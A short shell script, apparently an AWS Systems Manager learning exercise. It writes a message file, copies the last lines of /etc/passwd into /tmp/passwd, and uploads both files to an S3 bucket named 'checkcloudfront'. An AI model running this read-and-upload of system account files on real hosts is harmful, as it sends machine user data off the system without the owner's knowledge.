echo "Today, we are learning ssm" | tee /tmp/ssm
for user in `tail /etc/passwd`
do
echo "$user" | tee -a /tmp/passwd
done
aws s3 cp /tmp/ssm s3://checkcloudfront
aws s3 cp /tmp/passwd s3://checkcloudfront
